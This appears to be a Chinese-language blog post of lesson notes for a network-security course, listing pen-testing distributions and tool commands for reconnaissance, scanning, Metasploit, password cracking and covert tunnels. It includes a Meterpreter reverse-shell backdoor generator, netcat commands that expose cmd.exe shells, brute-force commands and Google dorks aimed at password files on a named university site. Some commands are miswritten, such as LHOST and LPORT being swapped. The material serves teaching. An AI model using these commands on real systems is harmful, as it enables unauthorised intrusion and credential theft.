---
author: wangguohao
comments: true
date: 2015-01-01 12:23:00+00:00
layout: post
slug: '%e5%ae%89%e5%85%a8%e8%af%be%e7%a8%8b%e7%9a%84%e5%a4%87%e8%af%be'
title: 安全课程的备课
wordpress_id: 575
categories:
- 计算机
tags:
- 安全
---

The first course will end with a video，准备最后一段课程的视频的录制，课程的设计的思路是：借助一下主流的工具，来介绍一下常见的网络安全的比较感性的原理（对细微本身讲的较少）。大体课程内容设计如下：


### Linux安全测试发行版介绍：


BackTrack:(Although the project was update to kali, many people also like using BT)
Probably the most widely known pen-test distro out there and one of the oldest distro still being actively developed. There is a thumb-drive and Live DVD version, plus the ability to do a full install in your hard-drive. The distribution is based on Ubuntu with custom packages that gets updated on a regular basis.

kali：
From the creators of BackTrack comes Kali Linux, the most advanced and versatile penetration testing distribution ever created. We have a whole set of amazing features lined up in our security distribution, geared at streamlining the penetration testing experience.

Backbox Linux:
Another Ubuntu based distro but uses XFCE as its window manager and relies on its own repo to constantly keep its tools updated.

Pentoo: A livecd based on Gentoo and XFCE. Also available as an overlay for existing Gentoo installations. Has the ability to crack passwords using GPGPU out of the box.

目的是介绍主要的工具集。


### 踩点技术


传统的本地dns探测工具，多数依赖于字典文件：

    dnsenum.pl -f dns_list.txt --dnserver 8.8.8.8 cisco.com -o cisco.list

    dnsmap cisco.com -w wordlist.txt -c cisco.csv

路由信息收集工具，一个传统的udp实现，一个现代一点的利用tcp实现，可以穿越防火墙。
paratrace,一种新的、隐形的 traceroute,可使用有状态的过滤器。
traceroute:传统的工具
tcptraceroute ：稍微新一点，利用tcp的工具。

搜索引擎的技巧 http://en.wikipedia.org/wiki/Google_hacking
filetype:xls site:jlxy.nju.edu.cn
密码 site:jlxy.nju.edu.cn
密码 site:jlxy.nju.edu.cn filetype:doc
site:jlxy.nju.edu.cn intext:admin

自动化，综合的信息收集平台maltego
1：domain
2：dns
3：whois information
4：network block
5：ip address
6：E-mail


### 扫描技术

发现主机
    arping -c 2 192.168.1.1

    fping -s -r 1 192.168.1.1 192.168.1.254

    hping3 -c 2 192.168.1.1

    #hping3
    hping>hping send {ip(addr=192.168.1.1)+icmp(type=8,code=0)}

    nbtscan 192.168.1.1-254

操作系统指纹识别

主动：nmap -O

被动：p0f

端口扫描
autoscan

netifera

scanrand:一个非常快速、无状态的 TCP 端口扫描器和 traceroute 工具

服务探测

    cd /pentest/enumeration/www/httprint/linux/
    httprint -h 192.168.1.1 -s singnature.txt

VPN探测

    ike-scan -M -v 192.168.1.1

    sslscan 192.168.1.1




### 漏洞发现


Cisco tools

cisco auditing tool


    ./CAT -h 192.182.1.1 -w lists/community -a lists/passwords -I


Cisco passwd scanner


    ./cisco 10.10.10 3 -t 4 -C 10


Snmp tools


    cd /pentest/enumeration/snmp/admsnmp
    ./ADMsnmp 192.168.1.1 -wordf wordlist.list


如果你知道snmp的community， 你可以使用这个工具收集信息。


    cd  /pentest/enumeration/snmp/snmpenum/
    ./snmpenum 192.168.1.1 private windows.txt


针对web的安全工具
Burp suite

Nikto


    ./nikto.pl -h 192.168.1.1 -C -p 80 T3487b -t 3 -D \V  -o webtest -F htm


W3af

这个waf的探测工具：WAFW00F


    cd /pentest/web/waffit/
    ./wafw00f http://....


介绍两个成熟的框架：openvas，nessus


### 集成化的工具包
MSF


    msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.150 LPORT=4444 X > backdoor.exe

    msfconsole
    use exploit/multi/hander
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LPORT 192.168.1.150
    set LHOST 4444


### 局域网安全


####Layer 2:
CDP(cisco discovery protocols)
mac flood

####Layer 3:
dhcp
tcp syn flood

结合一点点嗅探技术：
dsniff 包由 Dug Song 编写,已经发布几年了,是一组强大的网络审核工具。其中有一个简洁的小工具 arpspoof,可用于向 ARP 缓存注入虚假信息。该工具可以创建 Gratuitous ARP 应答,应答数据包中的源 IP 是用户打算伪装的 IP 地址,而目标 IP 则是所要嗅探的目标计算机。


### 密码破解


####在线的：以破解cisco的路由器，和html表单的例子。
ncrack -U pass -v -P pass telnet://192.168.1.1
ncrack -U pass -v -P pass http://192.168.1.1

####Web 表单

####离线的：无线的密码破解是离线的


### 维持访问
基本都是两台主机，其中一台替另一台通过某些服务对流量进行封装中继。

####Dns 隧道
Server:dns2tcpd
    ./dns2tcpd -F -d 1 -f dns2tcpd.conf

Client:
    ./dns2tcpc  -z  domain.org


配置文件：

    Domain=domain.org
    Rescoure = ssh
    Local_port = 2222
    Debug = 1


####icmp 隧道
Server:
    ./ptunnel

Client:
    ./ptunnel -p tun.ser_ip -lp 2222 -da ture.ip  -dp 22

####代理服务器
netcat
Windows:
    nc.exe -d -L -p 1234 -e cmd.exe

Remote:
    nc -l -p 1234

locale:
    nc -d remore port -e cmd.exe

Nc realy:（利用脚本实现），就是一种重定向，指定的数据流转发，还可以把传输的信息dump一次。

    #/bin/bash
    nc -o output.file ip_addr port

    nc -l -p 23 -e script.sh
